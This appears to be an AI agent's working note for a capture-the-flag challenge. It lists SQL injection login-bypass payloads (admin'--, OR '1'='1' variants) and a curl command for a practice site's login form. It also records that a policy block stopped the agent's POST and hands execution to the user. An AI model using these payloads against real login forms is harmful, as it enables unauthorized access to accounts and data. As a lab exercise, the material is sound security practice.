# Tricatel SQL login — https://sql.cyberzerk.fr — NOT yet tested (POST blocked in preparation)
Form (from index.html fetched 2026-11-10 06:41 UTC): POST / username + password.
Dev note on page: "TODO: Ajouter la verification CSRF et le hash des mots de passe. Note: pousse en prod a 04:12 AM."
Admin zone CSS present in page source (.admin-header, .dump-box, .flag) — after admin login the CEO memo + flag are shown.
Payloads to try, in order (each with any password, e.g. x):
1. username: admin'--   (comment out password check; note trailing space after --)
   curl: curl -s -c cj.txt -b cj.txt -d "username=admin'--&password=x" https://sql.cyberzerk.fr/
2. username: admin' OR '1'='1'--
3. username: ' OR '1'='1'--
4. username: admin' OR 1=1--
Then grep response for CyberZerk{ / memo / .flag div.
Limitation: POST to sql.cyberzerk.fr was denied during proactivity preparation
  (policy_denied, hitl_domain_allow_cyberzerk_fr_cbc53e10, POST /) — must be run by the main agent / user.
